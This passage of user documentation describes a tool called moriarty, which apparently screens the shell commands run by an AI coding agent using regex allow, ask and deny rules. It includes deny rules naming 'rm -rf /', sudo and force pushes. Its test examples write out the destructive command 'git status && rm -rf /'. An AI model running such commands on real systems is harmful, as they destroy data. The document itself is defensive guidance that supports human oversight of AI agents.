evaluable. Here-documents, here-strings, process or command substitution, subshells, and the existing bailout constructs
remain fail-safe and cannot be enabled by `AllowRedirect`; matching `DenyRedirect` rules still block confidently parsed
static endpoints.

A pattern still has to guard a program's **own** ability to run code or write files — for example `find -exec`,
`sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see them.

Preview the original leaf, redirect-free command match, each endpoint's original and resolved form, locality, matching
redirect rule, final primary rule, and ordered contributors with:

```bash
moriarty test bash-rules --mode plan --explain '<command>'
```

Generate exact endpoint rules from recorded prompts explicitly:

```bash
moriarty rules suggest --action allow-redirect --match exact
```

Ordinary exact suggestions use redirect-free command text. Prefix and fuzzy suggestions use the parsed program value, so
a prefix redirect such as `>report cargo build` clusters under `cargo`; leaves whose normalized command text still does
not begin with that parsed value (for example unsupported command-name shapes) are omitted. Redirect suggestions are
never chosen by default. Prefix and fuzzy redirect suggestions are rejected before logs are read. The generator resolves
all targets in a record using one cwd context and the current filesystem, omits leaves containing any dynamic or
shell-context-dependent endpoint as well as command-blocked leaves, filters targets already covered by active redirect
policy, preserves each endpoint's input/output/both direction, and sets `allow_local = true` only for resolved project
paths. Ordinary `Allow` suggestions omit leaves already allowed by active command policy; `Ask` and `Deny` suggestions
retain a command-allowed leaf when redirect policy still prompts. Historical rows without cwd are excluded. Local
suggestions match cwd-relative names in every project; they are not scoped to the repository where they were mined.
Review generated rules before installing them; strict lint warns about broad redirect authority.

## Security Best Practices

### 1. Let the Engine Handle Shell Metacharacters

Because each command is split into leaves and un-analyzable constructs (`$(...)`, backticks, subshells, …) bail to a
prompt unless a command or endpoint deny blocks first, an allow-rule no longer needs character-class exclusions like
``[^|&;$`()<>{}]`` to stay safe:

```toml
# Fine: the splitter removes operators and bails on substitution
pattern = "^ls\\b"

# Still safe, just unnecessarily complex now
pattern = "^ls( [^|&;$`()<>{}]+)?$"
```

Keep restrictive patterns only for a program's **own** dangerous arguments (e.g. `find -exec`, `sed -i`), which the
splitter cannot see.

### 2. Anchor at the Start of a Leaf

Anchor allow-rules with `^` so they match from the start of a command, not mid-string. A trailing `$` is no longer
needed to stop a dangerous tail — `git status && rm -rf /` is split, and the `rm` leaf is judged on its own:

```toml
# Good: matches the start of the `git status` leaf
pattern = "^git status\\b"

# Avoid: matches "git status" anywhere, including inside `echo "git status"`
pattern = "git status"
```

### 3. Escape Special Regex Characters

Remember to escape regex metacharacters (`\`, `(`, `)`, `[`, `]`, `{`, `}`, `.`, `*`, `+`, `?`, `|`):

```toml
# Good: Escapes the dot
pattern = "^npm\\s+install$"

# Bad: Dot matches any character
pattern = "^npm.install$"
```

### 4. Treat Path Alias Names as Trusted Policy

Only configure variables whose sole intended meaning is a reusable path. Never use `bash_path_aliases` as a generic
assignment allow-list; unsupported forms prompt, and the option does not make an assignment or expanded path safe by
itself.

### 5. Place Specific Rules Before General Ones

```toml
# Good order
[[bash_rules]]
name = "deny-dangerous-rm"
pattern = "^rm\\s+-rf"
action = { type = "Deny", value = "rm -rf is too dangerous" }

[[bash_rules]]
name = "allow-safe-rm"
pattern = "^rm\\s+[^-]"
action = { type = "Allow" }
```

### 6. Use Fragments for Security Patterns

Define security patterns once as fragments and reuse them:

```toml
[pattern_fragments]
no_injection = "[^|&;$`()<>{}]"

[[bash_rules]]
name = "cargo-commands"
pattern = "^cargo (build|check|test)( {{no_injection}}+)*$"
action = { type = "Allow" }
```

## Examples

> These examples use the simple per-leaf style. The fragment-heavy patterns shown elsewhere in this guide still work,
> but with the compound-aware engine they are usually unnecessary — see
> [How Bash Commands Are Evaluated](#how-bash-commands-are-evaluated).

### Example 1: Safe Cargo Commands

```toml
# Filter the browser-opening flag from cargo doc
[[bash_rules]]
name = "cargo-doc-no-browser"
pattern = "^cargo doc\\b.*--open"
action = { type = "ArgumentFilter", remove = ["--open", "-o"], reason = "Browser not useful for Claude" }

# Allow the safe cargo subcommands. The splitter handles pipes and chaining; redirects
# additionally need direction-matching AllowRedirect rules for every endpoint.
[[bash_rules]]
name = "cargo-safe-commands"
pattern = "^cargo (build|check|test|clippy|fmt|doc)\\b"
action = { type = "Allow" }
```

### Example 2: Git Operations

```toml
[[bash_rules]]
name = "allow-git-read"
pattern = "^git (status|diff|log|show)"
action = { type = "Allow" }

[[bash_rules]]
name = "ask-git-write"
pattern = "^git (commit|push|pull|rebase)"
action = { type = "Ask" }

[[bash_rules]]
name = "deny-git-force"
pattern = "^git\\s+push.*--force"
action = { type = "Deny", value = "Force push is not allowed" }
```

### Example 3: Docker Safety

```toml
[[bash_rules]]
name = "docker-add-dry-run"
pattern = "^(docker\\s+system\\s+prune)"
action = { type = "Modify", value = "$1 --dry-run" }

[[bash_rules]]
name = "allow-docker-read"
pattern = "^docker (ps|images|version)"
action = { type = "Allow" }

[[bash_rules]]
name = "ask-docker-write"
pattern = "^docker (build|run|exec)"
action = { type = "Ask" }
```

### Example 4: Comprehensive Security

```toml
[[bash_rules]]
name = "deny-rm-rf-root"
pattern = "^rm\\s+-rf\\s+/"
action = { type = "Deny", value = "Cannot delete from root" }

[[bash_rules]]
name = "deny-sudo"
pattern = "^sudo\\b"
action = { type = "Deny", value = "sudo not allowed" }

# `find -exec`/`-delete` run or remove files (its own flags, invisible to the splitter), so prompt
# on them before the read-only allow-rule below.
[[bash_rules]]
name = "find-mutating"
pattern = "^find\\b.* -(exec|delete)\\b"
action = { type = "Ask" }

# Read-only commands — simple prefixes; the engine prevents shell-injection tails. Redirects still
# need separate destination rules.
[[bash_rules]]
name = "allow-read-commands"
pattern = "^(ls|cat|head|tail|grep|wc|find)\\b"
action = { type = "Allow" }

[[bash_rules]]
name = "allow-cargo"
pattern = "^cargo (build|check|test|clippy|fmt)\\b"
action = { type = "Allow" }

[[bash_rules]]
name = "allow-git-read"
pattern = "^git (status|diff|log|show)\\b"
action = { type = "Allow" }

# Default: ask for anything not explicitly allowed
```

## Troubleshooting

### Rule Not Matching

**Problem**: Your rule isn't matching commands you expect.

**Solution**: Check both its regex and `modes`. A mode-restricted rule is skipped when the current mode is absent or not
listed; run `moriarty test bash-rules --mode <mode> --explain '<command>'` to reproduce the hook. Check the logs at
`~/.local/state/moriarty/hooks/` to see the recorded mode and which rule (if any) matched.

```bash
tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Bash rule matched"
```

### Pattern Expansion Errors

**Problem**: A rule you wrote silently has no effect (undefined fragment, circular fragment, a fragment exceeding the
nesting or total-expansion limit, or invalid regex), so the hook drops it.

**Solution**: Run `moriarty rules lint` (add `--strict` to also flag permanently disabled `modes = []`, missing
mode-overlapping redirect policy, likely-shadowed, and over-broad rules). It reports every rule the hook silently
ignores and exits nonzero if any exist:

```bash
moriarty rules lint --strict
```

### Unexpected Modifications

**Problem**: Commands are being modified in unexpected ways.

**Solution**: Check your Modify rules and their capture groups. Use logs to see the transformation:

```bash
tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Command modified"
```

### Rules Not Loading

**Problem**: Your rules don't seem to be taking effect.

**Solutions**:

- Verify config file location: `~/.config/moriarty/tool_rules.toml`
- Check TOML syntax: `cat ~/.config/moriarty/tool_rules.toml`
- Look for parse errors in logs: `~/.local/state/moriarty/hooks/`

### Testing Patterns

Test a command against your rules with `moriarty test bash-rules`. Add `--explain` to see how the command splits into
leaves, which rule matches each leaf, and the merged decision:

```bash
moriarty test bash-rules --mode default --explain 'git status && rm -rf /'
```

For regex-syntax questions, online testers like [regex101.com](https://regex101.com/) help — but remember:

- Moriarty uses Rust regex syntax (use the "Rust" flavor)
- Patterns are case-sensitive

## Further Reading

- [Rust Regex Syntax](https://docs.rs/regex/latest/regex/#syntax) - Detailed regex syntax documentation
- [TOML Specification](https://toml.io/) - Configuration file format
- `~/.local/state/moriarty/hooks/` - Moriarty logs showing rule evaluation
